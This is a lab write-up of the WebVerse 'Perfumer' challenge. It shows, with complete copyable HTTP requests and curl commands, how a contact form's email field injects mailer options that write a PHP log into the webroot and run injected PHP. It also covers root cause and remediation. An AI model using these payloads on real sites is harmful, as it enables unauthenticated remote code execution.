---
title: "WebVerse Perfumer: Mailer Options to PHP Execution"
date: 2026-09-16T00:00:00+02:00
lastmod: 2026-09-16T00:00:00+02:00
draft: false
author: "Mdk22"
description: "The Perfumer contact form let an email value change mailer options. A failed first log exposed the queue problem; a corrected log carried a nonce, and a PHP log returned computed output."
summary: "An email field changed the mailer's -X and queue options. A new web-readable log, unique message marker, and computed PHP output confirmed the chain in separate Caido and Terminal runs."
categories:
  - "Web Security Write-Ups"
tags:
  - "WebVerse"
  - "Perfumer"
  - "Argument Injection"
  - "Mailer"
  - "PHP"
  - "Caido"
  - "curl"
  - "CWE-88"
  - "CWE-73"
platform: "WebVerse"
lab: "Perfumer"
difficulty: "Medium"
showToc: true
TocOpen: false
case_id: "CASE-024"
case_featured: false
case_summary_short: "A contact-form email changed mailer options, wrote a transcript into the webroot, then reached PHP execution through a .php log."
case_status: "SOLVED / VERIFIED"
case_classification: "Mailer Argument Injection / Webroot PHP Execution"
case_family: "execution"
case_evidence:
  - "Browser"
  - "Caido"
  - "Terminal"
  - "curl"
case_verified: true
case_caido: true
case_independent_curl: true
primary_cwe: "CWE-88"
cwes:
  - "CWE-88"
  - "CWE-73"
patterns:
  - "Mailer Option Injection"
methods:
  - "Invalid-versus-Valid Differential"
  - "Cross-Client Verification"
---

> **Quick note:** Perfumer was reproduced on 16 September 2026 in two fresh WebVerse instances, first with Caido and then with `curl`. I kept the temporary hosts and file names visible so each step is easy to match to its run. Browser cookies and literal challenge flags are redacted in the screenshots. Use your own fresh host and unique file names when following along.

## Executive Summary

Perfumer's contact form accepted a normal email address and returned a generic thank-you page. A lab hint suggested that the address also reached the mail program. It was a lead, not proof, so I picked a new text file name and confirmed it returned `404` before submitting the form.

Adding `-X` to the email field made that file appear under the webroot. It only contained a mail-queue permission error. That failure mattered: it showed an effect on the mailer, but did not yet show control over the message body. Adding `-OQueueDirectory=/tmp` in the next request produced a readable mail transcript containing a unique nonce from the submitted message.

Next came a `.php` file. Its message contained `17*19`; requesting the new file returned `PERFUMER_COMPUTED_323`. PHP computed that result rather than copying the expression as plain text. A final, limited payload read the WebVerse objective and stopped after the first complete flag. A separate Terminal instance repeated the same comparisons.

> **Confirmed finding:** User-controlled email text changed mailer options, including the `-X` log path. That let the mailer write a log into the public webroot, where the web server processed it as PHP. The contact handler's source was unavailable, so its exact mailer call remains unknown.

## 1. Report Profile

| Field | Verified value |
| --- | --- |
| Platform | WebVerse |
| Lab | Perfumer, Weekly Challenge, Medium |
| Reproduction date | 16 September 2026 |
| Entry point | `POST /contact.php`, `application/x-www-form-urlencoded` |
| Controlled fields | `email` for mailer options, `message` for log content |
| First file | New `.txt` log containing a queue permission error |
| Corrected file | Mail transcript containing the submitted nonce |
| Execution check | `.php` log returned `PERFUMER_COMPUTED_323` from `17*19` |
| Final result | WebVerse objective read in both fresh instances; Caido solved screen recorded |
| Primary weakness | [CWE-88](/cwes/cwe-88/), argument injection |
| Supporting path control | [CWE-73](/cwes/cwe-73/), user-influenced log path |
| Evidence | Browser, Caido, Terminal, `curl`, and WebVerse solved state |

### Verified Attack Chain

```text
Fresh Perfumer instance
  > public page links to /contact.php
Contact form and benign POST
  > name, email, subject, message; normal thank-you response
Unique .txt path before the first write
  > 404
Email with -X/var/www/html/<unique>.txt
  > new file; mailer queue permission error
New .txt path before the corrected write
  > 404
Email with -OQueueDirectory=/tmp and -X
  > mail transcript contains the unique message nonce
New .php path before the probe
  > 404
Same mailer options with PHP arithmetic in message
  > PERFUMER_COMPUTED_323 from 17*19
New objective .php path before the final write
  > 404
One objective payload and one readback
  > complete WebVerse flag, then stop
```

## 2. Scope and Evidence Limits

Caido and Terminal used separate fresh instances, with different temporary hosts and file names. Each request, response, and command below belongs to the run shown beside it. When reproducing the steps, use your own current host and new file names.

- The thank-you page was the normal response for both benign and modified submissions. It was not used as an exploit signal or proof that email was delivered.
- First, `-X` produced a queue error, not controlled message content. That error led to the next option.
- A `Reply-To` header containing option-shaped text cannot prove argument parsing by itself. A new `-X` file and mailer-generated transcript provide the useful comparison.
- The arithmetic marker confirms PHP evaluation in this instance. It does not prove shell metacharacter execution or access to another host.
- Final PHP checked two flag-named environment variables and four exact flag-named file paths. Its response does not identify which one held the value.
- The payload attempted to remove its own test files. No request was made after the objective to verify that cleanup succeeded.
- Contact handler source was unavailable. These observations support mailer option injection, not a claim about its exact implementation.

This maps to [MITRE CWE-88](https://cwe.mitre.org/data/definitions/88.html): text supplied as an address changed the mailer's arguments. [MITRE CWE-73](https://cwe.mitre.org/data/definitions/73.html) also fits the observed control over the log destination. It is not a file-upload bug; no file was uploaded through the contact form.

## 3. Evidence-Led Chronological Reproduction

Each useful comparison followed `404 -> POST -> readback`. I used a new file name and checked it before every write, so an old file could not be mistaken for a new result. Both runs followed the same order:

1. Confirm the fresh host and locate the contact form from the public page.
2. Read the form contract and submit one normal message.
3. Check that the first text path does not exist, then try `-X` in `email`.
4. Read the new file. Its queue error explains why the first attempt is only partial proof.
5. Check a second text path, add `-OQueueDirectory=/tmp`, and find the submitted nonce in the resulting mail transcript.
6. Check a fresh `.php` path, write the harmless arithmetic probe, and compare `17*19` in the request with `323` in the response.
7. Check a final path, send the limited objective PHP, read it once, and stop.

## 4. Caido/Burp Reproduction

Copyable requests use `<CAIDO_LAB_HOST>`; screenshots show the temporary host from this run. Caido's browser captures include a redacted cookie. Nothing in the result depended on that cookie as an authentication condition.

### Step 1: Follow the Contact Link and Read the Form

The fresh homepage returned `200` and linked to `/contact.php`. I followed that link to find the route on this instance.

```http
GET / HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

```bash
curl -i -sS 'https://<CAIDO_LAB_HOST>/'
```

![Fresh Perfumer homepage](caido-001_homepage_browser.png)

**Caido 1:** The public site and its Contact navigation are visible.

![Caido root request](caido-002_root_get_request.png)

**Caido 2:** The request binds this track to the fresh host.

![Caido root response](caido-003_root_get_response.png)

**Caido 3:** The response contains the `/contact.php` link.

```http
GET /contact.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![Caido contact request](caido-004_contact_get_request.png)

**Caido 4:** The browser follows the discovered route.

![Caido contact response](caido-005_contact_get_response.png)

**Caido 5:** The route returns the contact page.

![Contact form source](caido-006_contact_form_source.png)

**Caido 6:** The form uses `POST /contact.php` with `name`, `email`, `subject`, and `message`. Its email field is `type="text"`, not a browser email validator. Server-side validation is still needed.

### Step 2: Keep the Normal Form Result for Comparison

For the normal browser submission, the address was `tester@example.com`; later Replay payloads used `tester@example.invalid`. That difference does not change what this step shows: ordinary form behavior, not a paired security oracle.

```http
POST /contact.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
Content-Type: application/x-www-form-urlencoded

name=Lab+Test&email=tester%40example.com&subject=Website+enquiry&message=Perfumer+lab
```

```bash
curl -i -sS -X POST 'https://<CAIDO_LAB_HOST>/contact.php' \
  --data-urlencode 'name=Lab Test' \
  --data-urlencode 'email=tester@example.com' \
  --data-urlencode 'subject=Website enquiry' \
  --data-urlencode 'message=Perfumer lab'
```

![Normal contact success page](caido-007_baseline_browser_success.png)

**Caido 7:** The browser says thank you.

![Normal contact POST request](caido-008_baseline_post_request.png)

**Caido 8:** The exact benign body is visible in the captured request.

![Normal contact POST response](caido-009_baseline_post_response.png)

**Caido 9:** The response is `200`. Modified submissions later return the same page, so this is not exploit proof.

### Step 3: First `-X` Attempt, Then the Queue Error

Before changing the POST, `/perfumer_caido_4d18_a1.txt` returned `404`. In Replay, I added a mailer-shaped `-X` option after the email address. Its destination points into `/var/www/html`, the webroot in this run.

```http
GET /perfumer_caido_4d18_a1.txt HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![First text path missing in browser](caido-010_a1_precheck_browser_404.png)

**Caido 10:** Browser check: no file before the POST.

![First text path Caido request](caido-011_a1_precheck_get_request.png)

**Caido 11:** Here is the path checked in Replay.

![First text path 404 response](caido-012_a1_precheck_get_response_404.png)

**Caido 12:** The server returns `404` for that path.

```http
POST /contact.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
Content-Type: application/x-www-form-urlencoded

name=Lab+Test&email=tester%40example.invalid+-X%2Fvar%2Fwww%2Fhtml%2Fperfumer_caido_4d18_a1.txt&subject=Website+enquiry&message=Perfumer+lab
```

Decoded, `email` reads `tester@example.invalid -X/var/www/html/perfumer_caido_4d18_a1.txt`. Pick your own unique file name when reproducing; this recorded name is not a required token.

![First X option POST request with cookie redacted](caido-015_a1_x_write_request_redacted.png)

**Caido 13:** This copy keeps the full payload visible and hides only the browser cookie.

![First X option POST response](caido-014_a1_x_write_response.png)

**Caido 14:** Another `200` thank-you page. The result check comes next.

```http
GET /perfumer_caido_4d18_a1.txt HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![First text file browser readback](caido-016_a1_readback_browser_queue_error.png)

**Caido 15:** Now the file exists, but it shows a mail-queue error.

![First text file readback request](caido-017_a1_readback_get_request.png)

**Caido 16:** Readback uses the same path that returned `404`.

![First text file readback response](caido-018_a1_readback_get_response.png)

**Caido 17:** A `200` response contains `can not chdir(/var/spool/mqueue-client/): Permission denied`. The changed email affected mailer behavior and created a file, but this still does not prove that the message body was written.

### Step 4: Correct the Queue Location and Check the Message Nonce

That queue error gave the next step: add `-OQueueDirectory=/tmp` before `-X`. I checked a second path first and put a unique nonce in the message. Readback needed to contain that nonce, not just the address string.

```http
GET /perfumer_caido_4d18_q1.txt HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![Queue log path missing in browser](caido-019_q1_precheck_browser_404.png)

**Caido 18:** No second file before the corrected POST.

![Queue log precheck request](caido-020_q1_precheck_get_request.png)

**Caido 19:** Replay records the unique `q1.txt` path.

![Queue log precheck response](caido-021_q1_precheck_get_response_404.png)

**Caido 20:** A `404` confirms that path is still empty.

```http
POST /contact.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
Content-Type: application/x-www-form-urlencoded

name=Lab+Test&email=tester%40example.invalid+-OQueueDirectory%3D%2Ftmp+-X%2Fvar%2Fwww%2Fhtml%2Fperfumer_caido_4d18_q1.txt&subject=Website+enquiry&message=PERFUMER_CAIDO_4D18_Q1_NONCE_A9
```

```text
email   = tester@example.invalid -OQueueDirectory=/tmp -X/var/www/html/perfumer_caido_4d18_q1.txt
message = PERFUMER_CAIDO_4D18_Q1_NONCE_A9
```

![Queue-corrected POST request](caido-022_q1_queue_write_request.png)

**Caido 21:** Both mailer-shaped options and the nonce are visible in the request.

![Queue-corrected POST response](caido-023_q1_queue_write_response.png)

**Caido 22:** Another generic `200`. The next GET checks what changed.

```http
GET /perfumer_caido_4d18_q1.txt HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![Mail transcript in browser](caido-024_q1_readback_browser_mail_output.png)

**Caido 23:** A new mail transcript appears in the browser.

![Mail transcript readback request](caido-025_q1_readback_get_request.png)

**Caido 24:** This GET targets the new file, not the earlier error file.

![Mail transcript readback response](caido-026_q1_readback_get_response.png)

**Caido 25:** Mailer headers and `PERFUMER_CAIDO_4D18_Q1_NONCE_A9` appear in the response. Now there is proof that the submitted message reached the web-readable transcript.

### Step 5: Prove PHP Evaluation with Arithmetic

Next I used a new path ending in `.php` and confirmed `404` before writing it. The form message contained `17*19`, not `323`. If readback returned `323`, PHP had evaluated the expression rather than simply copying the message.

```http
GET /perfumer_caido_4d18_probe.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![PHP probe missing in browser](caido-027_probe_precheck_browser_404.png)

**Caido 26:** The PHP path is absent before the write.

![PHP probe precheck request](caido-028_probe_precheck_get_request.png)

**Caido 27:** Replay shows the probe path.

![PHP probe precheck response](caido-029_probe_precheck_get_response_404.png)

**Caido 28:** It returns `404` before the write.

```php
<?php echo 'PERFUMER_COMPUTED_'.(17*19); ?>
```

```http
POST /contact.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
Content-Type: application/x-www-form-urlencoded

name=Lab+Test&email=tester%40example.invalid+-OQueueDirectory%3D%2Ftmp+-X%2Fvar%2Fwww%2Fhtml%2Fperfumer_caido_4d18_probe.php&subject=Website+enquiry&message=%3C%3Fphp+echo+%27PERFUMER_COMPUTED_%27.%2817%2A19%29%3B+%3F%3E
```

![PHP arithmetic POST request](caido-030_probe_php_write_request.png)

**Caido 29:** Encoded body: `.php` log path and arithmetic payload.

![PHP arithmetic POST response](caido-031_probe_php_write_response.png)

**Caido 30:** Another `200` from the form, not the execution check.

```http
GET /perfumer_caido_4d18_probe.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![Computed PHP marker in browser](caido-032_probe_readback_browser_computed_323.png)

**Caido 31:** Browser readback shows `PERFUMER_COMPUTED_323` inside the mail transcript.

![PHP probe readback request](caido-033_probe_readback_get_request.png)

**Caido 32:** GET uses the path that was absent in Caido 26 to 28.

![PHP probe readback response](caido-034_probe_readback_get_response.png)

**Caido 33:** Sent `17*19`; got `323` back. That is the execution check.

### Step 6: One Objective Read, Then Stop

After PHP execution was already proven, a final path was checked with `GET`. It returned `404` before the last form submission.

```http
GET /perfumer_caido_4d18_objective.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![Objective path missing in browser](caido-035_objective_precheck_browser_404.png)

**Caido 34:** The final path is not an old file.

![Objective path precheck request](caido-036_objective_precheck_get_request.png)

**Caido 35:** The route is recorded before the write.

![Objective path 404 response](caido-037_objective_precheck_get_response_404.png)

**Caido 36:** The response is `404`.

Here is the PHP logic used in the Caido run. It checks only two named environment variables and four named file paths, prints the first complete WebVerse flag, then attempts to delete its own test files. The readable script explains the payload; the form carried the URL-encoded body in the next block.

{{< code-resource file="perfumer-caido-objective-payload.php" lang="php" title="Caido objective PHP payload" meta="Recorded message field · full copyable source" >}}

{{< code-resource file="perfumer-caido-objective-body.txt" lang="text" title="Caido objective POST body" meta="application/x-www-form-urlencoded · full copyable body" >}}

```http
POST /contact.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
Content-Type: application/x-www-form-urlencoded

<COPY THE COMPLETE BODY FROM THE EXPANDABLE BLOCK ABOVE>
```

For another instance, replace the `perfumer_caido_4d18_` file prefix throughout the path and cleanup list with your own unique prefix, then URL-encode the four form fields again. Do not keep an old host or reuse a file that already exists. In Caido Replay, adjust `Content-Length` to match the new body or let the client recalculate it.

![Final objective POST request](caido-038_objective_write_request.png)

**Caido 37:** You can see the `email` option, target `.php` path, and encoded PHP message. The browser cookie is redacted.

![Final objective POST response](caido-039_objective_write_response_top.png)

**Caido 38:** Still the generic success page. Flag proof comes from the readback.

```http
GET /perfumer_caido_4d18_objective.php HTTP/1.1
Host: <CAIDO_LAB_HOST>
```

![Objective response in browser with flag redacted](caido-041_objective_readback_browser_flag.png)

**Caido 39:** Browser readback shows the mail transcript and redacted final value together.

![Objective readback request](caido-042_objective_readback_get_request.png)

**Caido 40:** One GET requests the previously missing objective file.

![Objective readback response with flag redacted](caido-043_objective_readback_get_response_flag.png)

**Caido 41:** A `200` response contains one complete `WEBVERSE{REDACTED}` result. Its literal value is hidden; the route, response shape, and transcript context remain visible.

![WebVerse Perfumer challenge solved confirmation](caido-044_platform_challenge_solved.png)

**Caido 42:** WebVerse accepted the objective. No further Caido target request was made after the first complete value.

## 5. Terminal/CLI Reproduction

For Terminal, I started another fresh instance. Screenshots show its host from 16 September; copyable commands use `LAB_HOST` so you can supply your own. This run used direct `curl` commands, not a separate Python or shell script. First set the variable in Bash or zsh:

```bash
LAB_HOST='<YOUR_FRESH_PERFUMER_HOST>'
```

Enter only the hostname, without `https://` or a path. This run's file prefix was `perfumer_terminal_b37a`. For a new run, choose another unique prefix and keep it consistent in the `-X` path, GET route, and final cleanup list.

### Step 1: Find the Same Form on a Fresh Host

```bash
curl -i -sS "https://${LAB_HOST}/"
```

![Terminal root curl recon](terminal-001_root_curl_recon.png)

**Terminal 1:** Fresh root: `200` with a `/contact.php` link, on a separate host from Caido.

```bash
curl -i -sS "https://${LAB_HOST}/contact.php" \
  | grep -E 'HTTP/|<form|name="name"|name="email"|name="subject"|name="message"|<textarea|type="submit"'
```

![Terminal contact form contract](terminal-002_contact_form_contract.png)

**Terminal 2:** The contact form has the same four fields. A separate footer subscription form also appears in the output; it was not tested.

### Step 2: Record the Normal POST

```bash
curl -i -sS -X POST "https://${LAB_HOST}/contact.php" \
  --data-urlencode 'name=Lab Test' \
  --data-urlencode 'email=tester@example.invalid' \
  --data-urlencode 'subject=Website enquiry' \
  --data-urlencode 'message=Perfumer terminal baseline.'
```

![Terminal normal form POST](terminal-003_baseline_post.png)

**Terminal 3:** Normal POST returns `HTTP/2 200` and the same thank-you page. That does not confirm mail delivery.

### Step 3: First `-X` File and Its Queue Error

Before changing the form submission, I checked a new path and got `404`.

```bash
curl -i -sS "https://${LAB_HOST}/perfumer_terminal_b37a_a1.txt"
```

![Terminal first text path 404](terminal-004_a1_precheck_404.png)

**Terminal 4:** No file before the test.

```bash
curl -i -sS -X POST "https://${LAB_HOST}/contact.php" \
  --data-urlencode 'name=Lab Test' \
  --data-urlencode 'email=tester@example.invalid -X/var/www/html/perfumer_terminal_b37a_a1.txt' \
  --data-urlencode 'subject=Website enquiry' \
  --data-urlencode 'message=Perfumer terminal'
```

![Terminal first X option POST](terminal-005_a1_x_write_post.png)

**Terminal 5:** The form returns `200`. That alone says nothing about the log.

```bash
curl -i -sS "https://${LAB_HOST}/perfumer_terminal_b37a_a1.txt"
```

![Terminal first text file queue error](terminal-006_a1_readback_queue_error.png)

**Terminal 6:** The new file returns `200`, but contains `can not chdir(/var/spool/mqueue-client/): Permission denied`. Same partial result as Caido, and a reason to try `/tmp` as the queue directory.

### Step 4: Change the Queue Directory and Find the Nonce

```bash
curl -i -sS "https://${LAB_HOST}/perfumer_terminal_b37a_q1.txt"
```

![Terminal queue log path 404](terminal-007_q1_precheck_404.png)

**Terminal 7:** The second text file is absent before the corrected request.

```bash
curl -i -sS -X POST "https://${LAB_HOST}/contact.php" \
  --data-urlencode 'name=Lab Test' \
  --data-urlencode 'email=tester@example.invalid -OQueueDirectory=/tmp -X/var/www/html/perfumer_terminal_b37a_q1.txt' \
  --data-urlencode 'subject=Website enquiry' \
  --data-urlencode 'message=PERFUMER_TERMINAL_B37A_Q1_NONCE_A9'
```

![Terminal queue corrected POST](terminal-008_q1_queue_write_post.png)

**Terminal 8:** `-OQueueDirectory=/tmp`, `-X`, and the unique message marker are visible in the command.

```bash
curl -i -sS "https://${LAB_HOST}/perfumer_terminal_b37a_q1.txt"
```

![Terminal mail transcript and nonce](terminal-009_q1_readback_mail_nonce.png)

**Terminal 9:** The new response has mail headers, the modified `Reply-To`, and `PERFUMER_TERMINAL_B37A_Q1_NONCE_A9`. That matches the Caido proof of controlled log content.

### Step 5: Check PHP Execution, Not Just a Written File

```bash
curl -i -sS "https://${LAB_HOST}/perfumer_terminal_b37a_probe.php"
```

![Terminal PHP path 404](terminal-010_probe_precheck_404.png)

**Terminal 10:** No `.php` probe before the write.

```php
<?php echo 'PERFUMER_COMPUTED_'.(17*19); ?>
```

```bash
curl -i -sS -X POST "https://${LAB_HOST}/contact.php" \
  --data-urlencode 'name=Lab Test' \
  --data-urlencode 'email=tester@example.invalid -OQueueDirectory=/tmp -X/var/www/html/perfumer_terminal_b37a_probe.php' \
  --data-urlencode 'subject=Website enquiry' \
  --data-urlencode "message=<?php echo 'PERFUMER_COMPUTED_'.(17*19); ?>"
```

![Terminal PHP arithmetic POST](terminal-011_probe_php_write_post.png)

**Terminal 11:** The command sends `17*19`, not its answer.

```bash
curl -i -sS "https://${LAB_HOST}/perfumer_terminal_b37a_probe.php"
```

![Terminal computed PHP result](terminal-012_probe_readback_computed_323.png)

**Terminal 12:** Readback contains `PERFUMER_COMPUTED_323`. The `404 -> POST -> computed result` sequence repeats the PHP proof without Caido.

### Step 6: Final Objective Request and Stop

```bash
curl -i -sS "https://${LAB_HOST}/perfumer_terminal_b37a_objective.php"
```

![Terminal objective file 404](terminal-013_objective_precheck_404.png)

**Terminal 13:** No objective file before the POST.

Below is the full command from this run, with the host moved into `LAB_HOST` so it can be reused. PHP variables appear as `\$v`, `\$p`, `\$s`, `\$m`, and `\$n` because the shell sees a double-quoted `message` argument. Leave those backslashes in place or the shell will expand the variables before `curl` sends anything. The payload checks only the named locations for a complete WebVerse flag and attempts to remove only this run's files.

{{< code-resource file="perfumer-terminal-objective-command.sh" lang="bash" title="Terminal objective curl command" meta="Recorded command with a fresh-host variable · full copyable source" >}}

![Terminal objective write POST](terminal-014_objective_write_post.png)

**Terminal 14:** Command and generic `200` form response appear together. The objective check is the next GET.

```bash
curl -i -sS "https://${LAB_HOST}/perfumer_terminal_b37a_objective.php"
```

![Terminal objective response with flag redacted](terminal-015_objective_readback_flag.png)

**Terminal 15:** One GET returned the mail transcript and a complete `WEBVERSE{REDACTED}` value. No second GET or cleanup check followed.

## 6. Controls and Results

| Check | Observed result | What it tells us |
| --- | --- | --- |
| Normal form submission | `200`, thank-you page | Ordinary form behavior, not mailer or execution proof |
| First `.txt` path before POST | `404` | A later file is not stale content |
| `-X` POST, then first file GET | `200`, queue permission error | Email value affected mailer behavior and new file creation; message control still unproven |
| Second `.txt` path before POST | `404` | Fresh target for the queue-corrected request |
| `-OQueueDirectory=/tmp` with `-X` | New mail transcript and unique nonce | Mailer output and submitted message reached the chosen public path |
| `.php` probe before POST | `404` | No previous PHP probe at that path |
| PHP arithmetic write and readback | `17*19` sent, `323` returned | Server-side PHP evaluation, not simple reflection |
| Objective path before POST | `404` | Final file was new to this run |
| One objective readback | Complete redacted flag; Caido solved screen | Lab objective reached; no further target contact |
| Separate Terminal run | Same chain with `curl` on another host | Result did not depend on Caido or the first instance |

## 7. Root Cause and Classification

An email address should have stayed an email address. Here, option-shaped text added to it changed where the mailer wrote its transcript and which queue directory it used. That makes [CWE-88](/cwes/cwe-88/) the primary classification.

With `-X`, the input also controlled a server-side destination under `/var/www/html`, supporting [CWE-73](/cwes/cwe-73/). Once that destination ended in `.php`, the web server interpreted the log as PHP. The arithmetic response shows this happened in the test.

Without the source of `/contact.php`, there is no basis to say whether it used PHP `mail()`, built a shell string, or passed an argument list to a library. Option effects and the resulting files support the narrower finding without that guess. This is not labelled unrestricted file upload or general shell-command injection.

## 8. Confirmed Impact

On the two tested WebVerse instances, an unauthenticated contact-form submission controlled mailer options, wrote a web-readable log, and reached server-side PHP execution. Final PHP returned the challenge objective. Nothing here proves email delivery, further file or command access, another user's data, or what happened to the files after the attempted cleanup.

## 9. Remediation

Keep user addresses out of free-form mailer arguments. Use a mail API that handles the address and transport options as separate typed values. Keep the sender address under application control and use a validated user address only in `Reply-To` if the workflow needs it. Reject whitespace and option suffixes in the address field, but do not depend on validation alone to make command construction safe.

Keep the mailer from writing to the webroot. Store mail logs outside the document root and disable PHP handling in writable locations. Its filesystem permissions should cover only the paths it needs.

## 10. How to Verify the Fix

1. Submit a normal message. Form behavior should remain the same; verify delivery separately if the product requires it.
2. Check a new path, submit an address containing `-X`, and check the path again. No file should appear.
3. Repeat with `-OQueueDirectory` and another new path. User input must not change mailer options or create a public transcript.
4. Try a `.php` destination with a harmless arithmetic marker. No PHP-handled file or computed value should result.
5. Check permissions directly: the mailer identity should have no write access to the webroot, and writable directories should not execute PHP.

## 11. Conclusion

First, `-X` made a file that contained only a queue error. That error shaped the next request. Moving the queue directory to `/tmp` gave a transcript with the submitted nonce; using a `.php` extension then gave a computed result. Each check answered a different question: was a file created, did our message reach it, and did PHP run? A plain `200` from the form answered none of them.

Caido captured the requests and responses. A fresh Terminal instance repeated the steps with `curl` and stopped after one objective read. Paths and payloads remain visible; only cookies and literal flags are hidden.
